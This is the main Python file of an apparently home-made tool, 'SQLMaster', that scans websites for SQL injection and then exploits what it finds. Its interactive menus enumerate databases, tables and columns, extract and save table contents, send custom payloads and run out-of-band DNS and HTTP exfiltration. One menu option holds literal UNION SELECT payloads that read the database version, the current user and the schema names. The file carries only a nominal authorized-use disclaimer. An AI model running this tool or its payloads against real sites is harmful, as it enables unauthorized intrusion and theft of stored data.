#!/usr/bin/env python3
"""
SQLMaster - Advanced SQL Injection Scanner & Exploitation Tool
For authorized security testing only
"""

import os
import sys
import argparse
import signal
from datetime import datetime
from urllib.parse import urlparse, parse_qsl, quote
import requests
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
import yaml

# Add modules to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from scanner import SQLScanner
from crawler import WebCrawler
from tester import SQLTester
from exploit import SQLExploiter
from reporter import ReportGenerator

console = Console()

class SQLMaster:
    def __init__(self):
        self.config = self.load_config()
        self.scanner = None
        self.crawler = WebCrawler(self.config)
        self.tester = SQLTester(self.config)
        self.exploiter = SQLExploiter(self.config)
        self.reporter = ReportGenerator(self.config)
        self.results = []
        self.current_target = None
        
        # Set up signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def load_config(self):
        """Load configuration from YAML file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.yaml')
        try:
            with open(config_path, 'r') as f:
                return yaml.safe_load(f)
        except FileNotFoundError:
            # Create default config
            default_config = {
                'general': {
                    'timeout': 10,
                    'user_agent': 'SQLMaster/1.0',
                    'threads': 5,
                    'save_responses': False
                },
                'crawler': {
                    'max_depth': 2,
                    'exclude_extensions': [
                        '.jpg', '.png', '.gif', '.css', '.js', '.pdf',
                        '.mp4', '.mp3', '.zip', '.rar', '.exe', '.dmg'
                    ]
                },
                'reporting': {
                    'format': 'txt',
                    'include_proof': True
                },
                'exploitation': {
                    'dns_callback_port': 53,
                    'http_callback_port': 8000,
                    'callback_timeout': 10
                }
            }
            return default_config
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        console.print("\n[yellow][!] Interrupt received. Saving current results...[/yellow]")
        if self.current_target:
            self.save_results()
        console.print("[green][+] Exiting gracefully[/green]")
        sys.exit(0)
    
    def display_banner(self):
        """Display tool banner"""
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║                  SQLMaster v1.0                          ║
        ║    Advanced SQL Injection Scanner & Exploitation Tool    ║
        ║                 by ek0ms savi0r                          ║
        ╚══════════════════════════════════════════════════════════╝
        """
        console.print(Panel.fit(banner, style="bold cyan"))
        console.print("[yellow]Disclaimer:[/yellow] Use only on systems you have explicit permission to test!\n")
    
    def interactive_mode(self):
        """Interactive mode for user input"""
        console.print("[bold green]Interactive SQL Injection Scanner[/bold green]\n")
        
        # Get target input
        target_type = console.input("[cyan][?] Enter target type:\n1. Single URL\n2. List of domains from file\n3. Live crawling from domain\nChoice (1-3): [/cyan]").strip()
        
        targets = []
        
        if target_type == "1":
            url = console.input("[cyan][?] Enter target URL (e.g., http://example.com/page.php?id=1): [/cyan]").strip()
            if not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            targets.append(url)
            
        elif target_type == "2":
            file_path = console.input("[cyan][?] Enter path to domains file: [/cyan]").strip()
            try:
                with open(file_path, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
                    # Add http:// if missing
                    targets = [url if url.startswith(('http://', 'https://')) else f"http://{url}" 
                              for url in targets]
            except FileNotFoundError:
                console.print(f"[red][!] File not found: {file_path}[/red]")
                return
                
        elif target_type == "3":
            domain = console.input("[cyan][?] Enter domain to crawl (e.g., example.com): [/cyan]").strip()
            console.print("[yellow][*] Starting crawler...[/yellow]")
            targets = self.crawler.crawl_domain(domain)
            
            if not targets:
                console.print("[yellow][!] Crawler didn't find any URLs. Using base domain.[/yellow]")
                targets = [f"http://{domain}", f"https://{domain}"]
        else:
            console.print("[red][!] Invalid choice[/red]")
            return
        
        if not targets:
            console.print("[red][!] No targets to scan[/red]")
            return
        
        console.print(f"[green][*] Found {len(targets)} target(s) to scan[/green]")
        
        # Get testing options
        console.print("\n[bold cyan]Testing Options:[/bold cyan]")
        test_all = console.input("[cyan][?] Test all SQLi types? (y/n): [/cyan]").strip().lower() == 'y'
        
        if not test_all:
            console.print("\n[cyan]Select specific test types:[/cyan]")
            console.print("1. Error-based SQLi")
            console.print("2. Union-based SQLi")
            console.print("3. Boolean-based blind SQLi")
            console.print("4. Time-based blind SQLi")
            console.print("5. Stacked queries")
            console.print("6. Out-of-band SQLi")
            
            choices = console.input("[cyan][?] Enter choices (comma-separated, e.g., 1,2,3): [/cyan]").strip()
            test_types = [int(c) for c in choices.split(',') if c.strip().isdigit()]
        else:
            test_types = [1, 2, 3, 4, 5, 6]
        
        # Start scanning
        self.start_scanning(targets, test_types)
    
    def start_scanning(self, targets, test_types):
        """Start the scanning process"""
        if not targets:
            console.print("[red][!] No targets to scan[/red]")
            return
        
        console.print(f"\n[green][*] Starting scan on {len(targets)} target(s)...[/green]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            main_task = progress.add_task("[cyan]Overall progress...", total=len(targets))
            
            for i, target in enumerate(targets):
                self.current_target = target
                
                progress.update(main_task, advance=1, description=f"[cyan]Testing: {target[:50]}...[/cyan]")
                
                # Initialize scanner for this target
                self.scanner = SQLScanner(target, self.config)
                
                # Scan target and check if it should be skipped
                scan_results = self.scanner.scan()
                if scan_results and scan_results.get('skipped', False):
                    console.print(f"[yellow][!] Skipping {target} - {scan_results.get('skip_reason', 'Unsupported technology')}[/yellow]")
                    continue  # Skip to next target
                
                # Test each SQLi type
                for test_type in test_types:
                    if test_type == 1:
                        self.test_error_based(target, progress)
                    elif test_type == 2:
                        self.test_union_based(target, progress)
                    elif test_type == 3:
                        self.test_boolean_blind(target, progress)
                    elif test_type == 4:
                        self.test_time_based(target, progress)
                    elif test_type == 5:
                        self.test_stacked_queries(target, progress)
                    elif test_type == 6:
                        self.test_out_of_band(target, progress)
                
                # Save intermediate results
                if self.results:
                    self.save_results()
        
        if self.results:
            console.print(f"\n[green][+] Scan completed! Found {len(self.results)} vulnerabilities[/green]")
            # Generate report
            self.generate_report()
        else:
            console.print(f"\n[yellow][!] Scan completed. No vulnerabilities found.[/yellow]")
        
        # Ask about exploitation
        if self.results:
            self.ask_exploitation()
    
    def test_error_based(self, target, progress):
        """Test for error-based SQL injection"""
        task = progress.add_task(f"[yellow]Testing error-based SQLi...", total=100)
        
        results = self.tester.test_error_based(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[red][!] Error-based SQLi found: {result['url'][:80]}...[/red]")
                console.print(f"    Parameter: {result['parameter']}")
                console.print(f"    Payload: {result['payload'][:50]}...")
                if 'db_error' in result:
                    console.print(f"    DB Error: {result['db_error'][:100]}...")
        
        progress.remove_task(task)
    
    def test_union_based(self, target, progress):
        """Test for union-based SQL injection"""
        task = progress.add_task(f"[yellow]Testing union-based SQLi...", total=100)
        
        results = self.tester.test_union_based(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[red][!] Union-based SQLi found: {result['url'][:80]}...[/red]")
                console.print(f"    Parameter: {result['parameter']}")
                if 'columns' in result:
                    console.print(f"    Columns: {result['columns']}")
                if 'dbms' in result:
                    console.print(f"    DBMS: {result['dbms']}")
        
        progress.remove_task(task)
    
    def test_boolean_blind(self, target, progress):
        """Test for boolean-based blind SQL injection"""
        task = progress.add_task(f"[yellow]Testing boolean blind SQLi...", total=100)
        
        results = self.tester.test_boolean_blind(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[red][!] Boolean blind SQLi found: {result['url'][:80]}...[/red]")
                console.print(f"    Parameter: {result['parameter']}")
                if 'technique' in result:
                    console.print(f"    Technique: {result['technique']}")
                if 'true_response_len' in result and 'false_response_len' in result:
                    console.print(f"    Response diff: {result['true_response_len']} vs {result['false_response_len']}")
        
        progress.remove_task(task)
    
    def test_time_based(self, target, progress):
        """Test for time-based blind SQL injection"""
        task = progress.add_task(f"[yellow]Testing time-based SQLi...", total=100)
        
        results = self.tester.test_time_based(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[red][!] Time-based SQLi found: {result['url'][:80]}...[/red]")
                console.print(f"    Parameter: {result['parameter']}")
                if 'delay' in result:
                    console.print(f"    Delay: {result['delay']} seconds")
        
        progress.remove_task(task)
    
    def test_stacked_queries(self, target, progress):
        """Test for stacked queries SQL injection"""
        task = progress.add_task(f"[yellow]Testing stacked queries...", total=100)
        
        results = self.tester.test_stacked_queries(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[red][!] Stacked queries SQLi found: {result['url'][:80]}...[/red]")
                console.print(f"    Parameter: {result['parameter']}")
        
        progress.remove_task(task)
    
    def test_out_of_band(self, target, progress):
        """Test for out-of-band SQL injection"""
        task = progress.add_task(f"[yellow]Testing out-of-band SQLi...", total=100)
        
        results = self.tester.test_out_of_band(target, lambda advance: progress.update(task, advance=advance))
        
        if results:
            self.results.extend(results)
            for result in results:
                console.print(f"\n[yellow][!] Out-of-band SQLi attempted: {result['url'][:80]}...[/yellow]")
                console.print(f"    Parameter: {result['parameter']}")
                if 'note' in result:
                    console.print(f"    Note: {result['note']}")
        
        progress.remove_task(task)
    
    def save_results(self):
        """Save current results to file"""
        if not self.results:
            return
        
        # Create results directory if it doesn't exist
        os.makedirs('results', exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results/results_{timestamp}.json"
        
        import json
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        console.print(f"[green][+] Results saved to {filename}[/green]")
    
    def generate_report(self):
        """Generate a detailed report"""
        if not self.results:
            console.print("[yellow][!] No vulnerabilities found to report[/yellow]")
            return
        
        report_file = self.reporter.generate_report(self.results)
        console.print(f"\n[green][+] Detailed report generated: {report_file}[/green]")
    
    def ask_exploitation(self):
        """Ask user if they want to exploit found vulnerabilities"""
        console.print("\n[bold cyan]Exploitation Options:[/bold cyan]")
        
        exploit = console.input("[cyan][?] Do you want to exploit any findings? (y/n): [/cyan]").strip().lower()
        
        if exploit != 'y':
            return
        
        # Filter out SPA false positives
        real_vulnerabilities = []
        for result in self.results:
            # Check if it's likely a false positive from SPA
            url = str(result.get('url', '')).lower()
            param = str(result.get('parameter', '')).lower()
            response = str(result.get('response', '')).lower()
            
            # SPA indicators in URL or response
            spa_indicators = ['react', 'vue', 'angular', 'spa', 'webpack', 'bundle.js', 
                             'div id="root"', 'div id="app"', 'enable javascript']
            
            is_spa = False
            for indicator in spa_indicators:
                if indicator in url or indicator in response:
                    is_spa = True
                    break
            
            if is_spa:
                console.print(f"[yellow][!] Skipping likely false positive: {result.get('type')} on SPA[/yellow]")
                continue
            
            real_vulnerabilities.append(result)
        
        if not real_vulnerabilities:
            console.print("[yellow][!] No exploitable vulnerabilities found (filtered out SPAs/false positives)[/yellow]")
            return
        
        console.print(f"[cyan]Available vulnerabilities ({len(real_vulnerabilities)} after filtering):[/cyan]")
        for i, result in enumerate(real_vulnerabilities, 1):
            vuln_type = result.get('type', 'Unknown')
            url = result.get('url', 'N/A')
            param = result.get('parameter', 'N/A')
            # Truncate URL for display
            display_url = url[:40] + '...' if len(url) > 40 else url
            console.print(f"{i}. {vuln_type} - {display_url} ({param})")
        
        choice = console.input("[cyan][?] Select vulnerability to exploit (number): [/cyan]").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(real_vulnerabilities):
            self.exploit_vulnerability(real_vulnerabilities[int(choice)-1])
    
    def exploit_vulnerability(self, vulnerability):
        """Exploit a specific vulnerability"""
        vuln_type = vulnerability.get('type', 'Unknown').lower()
        url = vulnerability.get('url', 'N/A')
        
        console.print(f"\n[yellow][*] Exploiting {vuln_type} on {url[:50]}...[/yellow]")
        
        # Handle out-of-band SQL injection separately
        if 'out-of-band' in vuln_type:
            self.exploit_out_of_band(vulnerability)
            return
        
        # Show exploitation menu for other SQLi types
        if any(x in vuln_type for x in ['union', 'error', 'boolean', 'time', 'stacked']):
            console.print("\n[cyan]Exploitation Options:[/cyan]")
            console.print("1. Get database information")
            console.print("2. Enumerate databases")
            console.print("3. Enumerate tables")
            console.print("4. Enumerate columns")
            console.print("5. Extract data")
            console.print("6. Custom exploit")
            console.print("7. Test exploitation payloads")
            console.print("8. Save vulnerability details")
            
            choice = console.input("[cyan][?] Select option: [/cyan]").strip()
            
            if choice == "1":
                # Get database info
                info = self.exploiter.get_database_info(vulnerability)
                if info:
                    console.print(f"\n[green][+] Database Information:[/green]")
                    for key, value in info.items():
                        console.print(f"    {key}: {value}")
                else:
                    console.print("[yellow][!] Could not retrieve database information[/yellow]")
                    
            elif choice == "2":
                # Enumerate databases
                dbs = self.exploiter.enumerate_databases(vulnerability)
                if dbs:
                    # Filter out JavaScript/SPA garbage
                    filtered_dbs = []
                    for db in dbs:
                        # Skip JavaScript/HTML fragments
                        if any(x in str(db).lower() for x in ['function', 'document.', 'window.', 'var ', 'let ', 'const ', 
                                                              'getelement', 'addeventlistener', 'queryselector', 'innerhtml']):
                            continue
                        if len(str(db)) > 50:  # Skip very long strings (likely code)
                            continue
                        filtered_dbs.append(db)
                    
                    if filtered_dbs:
                        console.print(f"\n[green][+] Found {len(filtered_dbs)} database(s):[/green]")
                        for i, db in enumerate(filtered_dbs[:20], 1):  # Show only first 20
                            console.print(f"  {i}. {db}")
                        if len(filtered_dbs) > 20:
                            console.print(f"  ... and {len(filtered_dbs) - 20} more")
                    else:
                        console.print("[yellow][!] Could not enumerate databases (filtered out SPA garbage)[/yellow]")
                else:
                    console.print("[yellow][!] Could not enumerate databases[/yellow]")
                    
            elif choice == "3":
                # Enumerate tables
                db = console.input("[cyan][?] Enter database name: [/cyan]").strip()
                if db:
                    tables = self.exploiter.enumerate_tables(vulnerability, db)
                    if tables:
                        console.print(f"\n[green][+] Found {len(tables)} table(s) in '{db}':[/green]")
                        for i, table in enumerate(tables, 1):
                            console.print(f"  {i}. {table}")
                    else:
                        console.print(f"[yellow][!] Could not enumerate tables in '{db}'[/yellow]")
                else:
                    console.print("[red][!] No database specified[/red]")
                    
            elif choice == "4":
                # Enumerate columns
                db = console.input("[cyan][?] Enter database name: [/cyan]").strip()
                if db:
                    table = console.input("[cyan][?] Enter table name: [/cyan]").strip()
                    if table:
                        columns = self.exploiter.enumerate_columns(vulnerability, db, table)
                        if columns:
                            console.print(f"\n[green][+] Found {len(columns)} column(s) in '{db}.{table}':[/green]")
                            for i, col in enumerate(columns, 1):
                                console.print(f"  {i}. {col}")
                        else:
                            console.print(f"[yellow][!] Could not enumerate columns in '{db}.{table}'[/yellow]")
                    else:
                        console.print("[red][!] No table specified[/red]")
                else:
                    console.print("[red][!] No database specified[/red]")
                        
            elif choice == "5":
                # Extract data
                db = console.input("[cyan][?] Enter database name: [/cyan]").strip()
                if db:
                    table = console.input("[cyan][?] Enter table name: [/cyan]").strip()
                    if table:
                        columns_input = console.input("[cyan][?] Enter columns (comma-separated, or 'auto' to detect): [/cyan]").strip()
                        if columns_input.lower() == 'auto':
                            columns = self.exploiter.enumerate_columns(vulnerability, db, table)
                            if columns:
                                console.print(f"[cyan][*] Using detected columns: {', '.join(columns)}[/cyan]")
                            else:
                                console.print("[red][!] Could not detect columns[/red]")
                                return
                        else:
                            columns = [col.strip() for col in columns_input.split(',')]
                        
                        if not columns:
                            console.print("[red][!] No columns specified[/red]")
                            return
                        
                        data = self.exploiter.extract_data(vulnerability, db, table, columns)
                        
                        if data:
                            table_display = Table(title=f"Data from {db}.{table}")
                            for col in columns:
                                table_display.add_column(col)
                            
                            for row in data:
                                table_display.add_row(*[str(cell) for cell in row])
                            
                            console.print(table_display)
                            console.print(f"[green][+] Extracted {len(data)} row(s)[/green]")
                            
                            # Ask to save data
                            save = console.input("[cyan][?] Save extracted data to file? (y/n): [/cyan]").strip().lower()
                            if save == 'y':
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                filename = f"extracted_data_{db}_{table}_{timestamp}.txt"
                                with open(filename, 'w') as f:
                                    f.write(f"Data extracted from {db}.{table}\n")
                                    f.write(f"Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                    f.write(f"Columns: {', '.join(columns)}\n\n")
                                    for row in data:
                                        f.write(' | '.join(str(cell) for cell in row) + '\n')
                                console.print(f"[green][+] Data saved to {filename}[/green]")
                        else:
                            console.print("[yellow][!] No data extracted[/yellow]")
                    else:
                        console.print("[red][!] No table specified[/red]")
                else:
                    console.print("[red][!] No database specified[/red]")
                            
            elif choice == "6":
                # Custom exploit
                custom_payload = console.input("[cyan][?] Enter custom SQL payload: [/cyan]").strip()
                if custom_payload:
                    result = self.exploiter.exploit_generic(vulnerability, custom_payload)
                    if result:
                        console.print(f"[green][+] Request successful (Status: {result['status_code']})[/green]")
                        console.print(f"[cyan][*] Response time: {result['response_time']}s[/cyan]")
                        
                        # Show extracted data if any
                        extracted = self.exploiter.extract_union_data(result['response'])
                        if extracted:
                            console.print(f"\n[green][+] Extracted data:[/green]")
                            for i, data in enumerate(extracted[:10], 1):
                                console.print(f"  {i}. {data[:150]}{'...' if len(data) > 150 else ''}")
                        
                        # Save response
                        timestamp = datetime.now().strftime("%H%M%S")
                        filename = f"custom_exploit_{timestamp}.html"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(result['response'])
                        console.print(f"[green][+] Response saved to {filename}[/green]")
                    else:
                        console.print("[red][!] Exploit failed[/red]")
                else:
                    console.print("[red][!] No payload specified[/red]")
                        
            elif choice == "7":
                # Test exploitation payloads
                console.print("\n[cyan][*] Testing common exploitation payloads...[/cyan]")
                test_payloads = [
                    ("Database version", "' UNION SELECT 1,@@version--"),
                    ("Current user", "' UNION SELECT 1,user()--"),
                    ("Current database", "' UNION SELECT 1,database()--"),
                    ("All databases", "' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata--"),
                    ("Tables in current DB", "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--")
                ]
                
                for name, payload in test_payloads:
                    result = self.exploiter.test_payload(vulnerability, payload)
                    if result:
                        console.print(f"\n[cyan]{name}:[/cyan]")
                        console.print(f"  URL: {result['url'][:80]}...")
                        console.print(f"  Status: {result['status_code']}")
                        console.print(f"  Response time: {result['response_time']}s")
                        
                        extracted = self.exploiter.extract_union_data(result['response'])
                        if extracted:
                            console.print(f"  Extracted data:")
                            for i, data in enumerate(extracted[:3], 1):
                                console.print(f"    {i}. {data[:100]}{'...' if len(data) > 100 else ''}")
                        else:
                            console.print("  [yellow]No data extracted[/yellow]")
                    else:
                        console.print(f"\n[red]{name}: Failed[/red]")
                console.print()
                        
            elif choice == "8":
                # Save vulnerability details
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"vulnerability_details_{timestamp}.json"
                with open(filename, 'w') as f:
                    import json
                    json.dump(vulnerability, f, indent=2)
                console.print(f"[green][+] Vulnerability details saved to {filename}[/green]")
                
            else:
                console.print("[red][!] Invalid option[/red]")
                
        else:
            console.print("[yellow][!] Exploitation for this vulnerability type not yet implemented[/yellow]")
            console.print(f"[cyan]Vulnerability type: {vuln_type}[/cyan]")
    
    def exploit_out_of_band(self, vulnerability):
        """Handle out-of-band SQL injection exploitation"""
        console.print("\n[cyan]Out-of-band SQL Injection Exploitation[/cyan]")
        console.print("[yellow]Note: This requires an external callback server setup.[/yellow]")
        console.print("[yellow]For DNS exfiltration: Set up a DNS server that logs queries[/yellow]")
        console.print("[yellow]For HTTP exfiltration: Set up an HTTP server that logs requests[/yellow]")
        
        try:
            result = self.exploiter.exploit_out_of_band(vulnerability)
            if result:
                console.print(f"[green][+] Out-of-band exploitation completed[/green]")
                console.print(f"[cyan]Received {len(result)} callback(s)[/cyan]")
            else:
                console.print("[yellow][!] Out-of-band exploitation failed or no callbacks received[/yellow]")
        except Exception as e:
            console.print(f"[red][!] Out-of-band exploitation error: {str(e)}[/red]")
    
    def run(self):
        """Main entry point"""
        self.display_banner()
        
        parser = argparse.ArgumentParser(description='SQLMaster - Advanced SQL Injection Scanner')
        parser.add_argument('-u', '--url', help='Target URL')
        parser.add_argument('-f', '--file', help='File containing list of URLs')
        parser.add_argument('-d', '--domain', help='Domain to crawl and test')
        parser.add_argument('-o', '--output', help='Output file name')
        
        args = parser.parse_args()
        
        if args.url or args.file or args.domain:
            # CLI mode
            targets = []
            if args.url:
                url = args.url
                if not url.startswith(('http://', 'https://')):
                    url = f"http://{url}"
                targets.append(url)
            elif args.file:
                try:
                    with open(args.file, 'r') as f:
                        targets = [line.strip() for line in f if line.strip()]
                        # Add http:// if missing
                        targets = [url if url.startswith(('http://', 'https://')) else f"http://{url}" 
                                  for url in targets]
                except FileNotFoundError:
                    console.print(f"[red][!] File not found: {args.file}[/red]")
                    return
            elif args.domain:
                console.print("[yellow][*] Starting crawler...[/yellow]")
                targets = self.crawler.crawl_domain(args.domain)
                if not targets:
                    console.print("[yellow][!] Crawler didn't find any URLs. Using base domain.[/yellow]")
                    targets = [f"http://{args.domain}", f"https://{args.domain}"]
            
            if not targets:
                console.print("[red][!] No targets to scan[/red]")
                return
            
            console.print(f"[green][*] Found {len(targets)} target(s) to scan[/green]")
            self.start_scanning(targets, [1, 2, 3, 4, 5, 6])
        else:
            # Interactive mode
            self.interactive_mode()

if __name__ == "__main__":
    tool = SQLMaster()
    tool.run()
